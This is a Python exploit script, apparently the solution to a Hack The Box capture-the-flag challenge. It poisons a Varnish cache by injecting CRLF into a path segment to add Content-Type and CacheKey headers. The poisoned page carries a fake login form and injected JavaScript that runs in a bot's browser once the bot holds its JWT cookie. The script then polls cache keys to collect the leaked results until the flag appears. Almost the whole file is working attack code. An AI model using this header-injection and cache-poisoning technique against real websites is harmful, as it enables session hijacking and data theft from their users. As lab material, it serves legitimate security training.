import os, re, sys, time, urllib.parse
import requests

if len(sys.argv) not in (3, 4):
    print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port> [seconds]")
    sys.exit(1)

BASE = f"http://{sys.argv[1]}:{int(sys.argv[2])}"
HERE = os.path.dirname(os.path.abspath(__file__))
JS = open(os.path.join(HERE, "payload.js")).read()

# Poisoned page: login form so the bot can log in, plus the payload that runs once the bot has its jwt cookie.
HTML = (
    '</p><form action="/controller/login" method="post">'
    '<input id="username" name="username"><input id="password" name="password" type="password">'
    '<button id="login-btn" type="submit">login</button></form>'
    f"<script>{JS}</script><p>"
)
# CRLF in deviceId injects Content-Type and CacheKey so Varnish stores the page under the empty key.
POISON = (
    BASE + "/oracle/" + urllib.parse.quote(HTML, safe="")
    + "/1%0d%0aContent-Type:%20text%2Fhtml%0d%0aCacheKey:%20enable"
)
TAGS = ["S0", "S1", "S2", "S3", "S4", "F", "ERR"]

deadline = time.time() + (int(sys.argv[3]) if len(sys.argv) == 4 else 180)
seen = {}
while time.time() < deadline:
    requests.get(POISON, timeout=30)
    for tag in TAGS:
        e = requests.get(BASE + "/oracle/x/1", headers={"CacheKey": "omni-" + tag}, timeout=30)
        m = re.search(r"Mode: ([^<]*)", e.text)
        if m and seen.get(tag) != m.group(1):
            seen[tag] = m.group(1)
            print(tag, "->", m.group(1), flush=True)
    if "F" in seen and "HTB{" in seen["F"]:
        break
    time.sleep(1.5)
print("done", seen, flush=True)
